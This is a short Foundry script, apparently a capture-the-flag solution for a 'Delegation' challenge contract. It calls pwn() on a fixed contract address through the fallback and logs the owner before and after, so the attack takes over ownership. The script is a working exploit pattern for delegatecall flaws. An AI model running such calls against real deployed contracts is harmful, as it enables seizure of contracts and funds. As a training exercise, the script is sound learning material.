// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../challenges/6_Delegation.sol";

contract POC is Script {
    Delegation badIdea = Delegation(0xb59aCD7131cE6c4CbAAF32e8A06Da14f65C09268);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        console.log("Current owner: ", badIdea.owner());

        (bool success, ) = address(badIdea).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Hack failed");

        console.log("New owner: ", badIdea.owner());

        vm.stopBroadcast();
    }
}
